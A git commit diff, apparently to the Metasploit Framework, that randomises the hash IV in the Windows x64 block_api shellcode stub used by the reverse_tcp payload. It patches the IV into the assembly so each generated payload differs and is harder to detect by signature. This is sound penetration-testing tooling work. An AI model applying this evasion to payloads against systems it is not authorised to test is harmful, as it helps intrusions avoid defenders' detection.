ab0fdf96f85e5a1d78b0ae36076d4d18e9b9868e
dledda-r7 <diego_ledda@rapid7.com>
2026-04-15 04:36:45 -0400

    feat: block api randomization for windows/x64/reverse_tcp

--- lib/msf/core/payload/windows/x64/block_api_x64.rb
+++ lib/msf/core/payload/windows/x64/block_api_x64.rb
@@ -10,12 +10,27 @@ module Msf
 ###
 module Payload::Windows::BlockApi_x64
 
+  @block_api_iv = nil
+
+  def block_api_iv
+    @block_api_iv ||= rand(0x100000000)
+  end
   def asm_block_api(opts={})
-    Rex::Payloads::Shuffle.from_graphml_file(
+    @block_api_iv ||= rand(0x100000000)
+    asm = Rex::Payloads::Shuffle.from_graphml_file(
       File.join(Msf::Config.install_root, 'data', 'shellcode', 'block_api.x64.graphml'),
       arch: ARCH_X64,
       name: 'api_call'
     )
+    # Patch the assembly to set the correct IV
+    # db 0x41, 0xb9, 0x00, 0x00, 0x00, 0x00  =>  mov r9d, <iv>
+    iv_bytes = [block_api_iv].pack('V').bytes.map { |b| "0x%02x" % b }.join(', ')
+    asm.sub!("db 0x41, 0xb9, 0x00, 0x00, 0x00, 0x00", "db 0x41, 0xb9, #{iv_bytes}")
+    asm
+  end
+
+  def block_api_hash(mod, func)
+    Rex::Text.block_api_hash(mod, func, iv: @block_api_iv)
   end
 
 end
